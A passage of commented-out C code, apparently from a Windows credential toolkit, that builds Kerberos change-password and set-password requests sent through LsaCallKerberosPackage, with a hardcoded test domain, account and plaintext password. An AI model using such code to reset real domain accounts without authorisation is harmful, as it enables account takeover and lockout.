//		RtlCopyMemory(kerbChangePasswordRequestBuffer, &kerbChangePasswordRequest, sizeof(KERB_CHANGEPASSWORD_REQUEST));
//
//		status = LsaCallKerberosPackage(kerbChangePasswordRequestBuffer, sizeof(KERB_CHANGEPASSWORD_REQUEST) + size, (PVOID *)&dumPtr, &responseSize, &packageStatus);
//		if(NT_SUCCESS(status))
//		{
//			if(NT_SUCCESS(packageStatus))
//				kprintf(L"KerbChangePasswordMessage is OK\n");
//			else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbChangePasswordMessage / Package : %08x\n", packageStatus);
//		}
//		else PRINT_ERROR(L"LsaCallAuthenticationPackage KerbChangePasswordMessage : %08x\n", status);
//
//		LocalFree(kerbChangePasswordRequestBuffer);
//	}
//
///*
//	KERB_SETPASSWORD_REQUEST kerbSetPasswordRequest;
//	PBYTE kerbSetPasswordRequestBuffer;
//
//	DWORD size, responseSize = 1024, offset = sizeof(KERB_SETPASSWORD_REQUEST);
//	BYTE dumPtr[1024];
//
//	RtlZeroMemory(&kerbSetPasswordRequest, sizeof(KERB_SETPASSWORD_REQUEST));
//	kerbSetPasswordRequest.MessageType = KerbSetPasswordMessage;
//	RtlInitUnicodeString(&kerbSetPasswordRequest.DomainName, L"chocolate.local");
//	RtlInitUnicodeString(&kerbSetPasswordRequest.AccountName, L"testme");
//	RtlInitUnicodeString(&kerbSetPasswordRequest.Password, L"t2waza1234/");
//
//
//	size = kerbSetPasswordRequest.DomainName.Length + kerbSetPasswordRequest.AccountName.Length + kerbSetPasswordRequest.Password.Length;
//	if(kerbSetPasswordRequestBuffer = (PBYTE) LocalAlloc(LPTR, offset + size))
//	{
//		RtlCopyMemory(kerbSetPasswordRequestBuffer + offset, kerbSetPasswordRequest.DomainName.Buffer, kerbSetPasswordRequest.DomainName.Length);
//		kerbSetPasswordRequest.DomainName.Buffer = (PWCHAR) offset;
//		offset += kerbSetPasswordRequest.DomainName.Length;
//
//		RtlCopyMemory(kerbSetPasswordRequestBuffer + offset, kerbSetPasswordRequest.AccountName.Buffer, kerbSetPasswordRequest.AccountName.Length);
//		kerbSetPasswordRequest.AccountName.Buffer = (PWCHAR) offset;
//		offset += kerbSetPasswordRequest.AccountName.Length;
//
//		RtlCopyMemory(kerbSetPasswordRequestBuffer + offset, kerbSetPasswordRequest.Password.Buffer, kerbSetPasswordRequest.Password.Length);
//		kerbSetPasswordRequest.Password.Buffer = (PWCHAR) offset;
//		offset += kerbSetPasswordRequest.Password.Length;
//
//		RtlCopyMemory(kerbSetPasswordRequestBuffer, &kerbSetPasswordRequest, sizeof(KERB_SETPASSWORD_REQUEST));
//
//		status = LsaCallKerberosPackage(kerbSetPasswordRequestBuffer, sizeof(KERB_SETPASSWORD_REQUEST) + size, (PVOID *)&dumPtr, &responseSize, &packageStatus);
//		if(NT_SUCCESS(status))
//		{
//			if(NT_SUCCESS(packageStatus))
//				kprintf(L"kerbSetPasswordRequest is OK\n");
//			else PRINT_ERROR(L"LsaCallAuthenticationPackage kerbSetPasswordRequest / Package : %08x\n", packageStatus);
//		}
//		else PRINT_ERROR(L"LsaCallAuthenticationPackage kerbSetPasswordRequest : %08x\n", status);
//
//		LocalFree(kerbSetPasswordRequestBuffer);
//	}
//	*/
//
//	return STATUS_SUCCESS;
//}
#endif